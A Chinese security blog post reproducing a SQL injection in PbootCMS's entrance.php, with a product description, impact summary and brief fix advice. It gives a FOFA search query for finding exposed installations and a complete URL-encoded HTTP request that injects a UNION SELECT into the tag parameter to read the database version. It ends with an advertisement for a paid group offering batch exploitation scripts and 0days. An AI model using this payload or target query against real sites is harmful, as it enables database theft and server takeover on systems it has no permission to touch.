#  「漏洞复现」PbootCMS entrance.php SQL注入漏洞   
冷漠安全  冷漠安全   2024-12-16 00:00  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
0x01 免责声明  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
产品介绍  
  
PbootCMS是一套高效、简洁、强悍的可免费商用的PHP CMS（内容管理系统）源码，专注于企业网站的开发建设。 是全新内核且永久开源免费的PHP企业网站开发建设管理系统，是一套高效、简洁、 强悍的可免费商用的PHP CMS源码，能够满足各类企业网站开发建设的需要。系统采用简单到想哭的模板标签，只要懂HTML就可快速开发企业网站。官方提供了大量网站模板免费下载和使用，将致力于为广大开发者和企业提供最佳的网站开发建设解决方案。系统采用高效、简洁、强悍的模板标签，只要懂HTML就可快速开发企业网站；PHP语言开发，使用自主研发的高速多层开发框架及缓存技术；sqlite轻型数据库，放入PHP空间即可直接使用，可选mysql. pgsql等数据库，满足各类存储需求。  
  
0x03  
  
漏洞威胁  
  
由于PbootCMS entrance.php 文件代码逻辑缺陷存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。  
  
0x04  
  
漏洞环境  
  
FOFA:  
   
```
header="PbootCMS" || body="zbeol.com"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qicLNt0Pia6vtXd2wTazMDjcSeRkuBWcI4WJDJ2JicwnPnY0f5ITzWU6qxaX9cwruzPoemFKaKhv7qA/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
漏洞复现  
  
PoC  
```
POST /?tag=%7d%73%71%6c%3a%20%20%7b%70%62%6f%6f%74%3a%6c%69%73%74%20%66%69%6c%74%65%72%3d%31%3d%32%29%55%4e%49%4f%4e%28%53%45%4c%45%43%54%2f%2a%2a%2f%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%28%73%65%6c%65%63%74%2f%2a%2a%2f%76%65%72%73%69%6f%6e%28%29%29%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%29%2f%2a%2a%2f%23%2f%2a%2a%2f%7c%31%32%33%20%73%63%6f%64%65%3d%31%32%33%7d%5b%6c%69%73%74%3a%6c%69%6e%6b%20%6c%69%6e%6b%3d%61%73%64%5d%7b%2f%70%62%6f%6f%74%3a%6c%69%73%74%7d HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```  
  
查询数据库版本  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qicLNt0Pia6vtXd2wTazMDjcIa87aVtZPzz9Mggek0HoUt9hX1C3rjzv79dzaAu9ZZygzNPESicsuicA/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
批量脚本验证  
  
Nuclei验证脚本已发布  
  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qicLNt0Pia6vtXd2wTazMDjcX81ib1Hv8kWOXoXdmibhhUy0CiaI24AkWgOjvkefzicQsuHVNLTVCRQV0A/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
修复建议  
  
官方已修复该漏洞，请用户联系厂商修复漏洞：https://www.pbootcms.com/  
  
通过防火墙等安全设备设置访问策略，设置白名单访问。  
  
如非必要，禁止公网访问该系统。  
  
0x08  
  
加入我们  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全  
  
交个朋友，限时优惠券：加入立减25  
  
星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qicLNt0Pia6vtXd2wTazMDjcicJ5dQ6bQcn3LiayH5fCNV0CQnQ6Z59BdgGuADHlXSAbicTPj4E3XWSSA/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0qicLNt0Pia6vtXd2wTazMDjcb1bxXep3wazeKcICRKWtMzxI7HNfG80Hg796JNdqejCUJ2EpzjaNPw/640?wx_fmt=gif&from=appmsg "")  
  
  
